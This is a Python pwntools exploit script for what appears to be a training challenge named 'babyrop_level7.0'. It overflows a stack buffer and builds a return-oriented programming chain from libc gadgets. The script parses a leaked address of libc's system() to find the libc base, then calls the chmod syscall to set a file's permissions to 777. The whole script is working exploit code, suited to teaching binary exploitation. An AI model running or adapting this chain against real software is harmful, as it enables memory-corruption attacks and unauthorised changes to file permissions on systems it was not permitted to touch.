from pwn import *
import time

# Init
elf = ELF("/challenge/babyrop_level7.0")
context.arch = "amd64"
context.endian = "little"
io = elf.process()

# Vars
buffer_length = 76 + 4 + 8 # local_58 and variable int 4 byte (local_c) + EBP

# Retreive the leaked address from the stdout
io.recvuntil("in libc is: ")
libc_system_address = int(io.recvuntil(b".").decode()[:-1], 16)
print(hex(libc_system_address))

# Load the elf of libc
libc = ELF(io.libc.path)
print(io.libc.path)

system_function_in_libc_offset = libc.symbols['system']
libc_address = libc_system_address - system_function_in_libc_offset
print(hex(libc_address))
print(hex(system_function_in_libc_offset))

# ROPgadgets from libc for chmod
libc_set_rax_gadget = libc_address + 0x36174
libc_set_rdi_gadget = libc_address + 0x23b6a
libc_set_rsi_gadget = libc_address + 0x2601f
libc_syscall_gadget = libc_address + 0x2284d
string_leaving_address = p64(next(elf.search(b"Leaving!\x00")))

# Payload
payload = b"A"*buffer_length +\
    p64(libc_set_rax_gadget) + p64(0x5A) + p64(libc_set_rdi_gadget) + string_leaving_address + p64(libc_set_rsi_gadget) + p64(0o777) + p64(libc_syscall_gadget)

# Action
io.sendline(payload)
io.interactive()
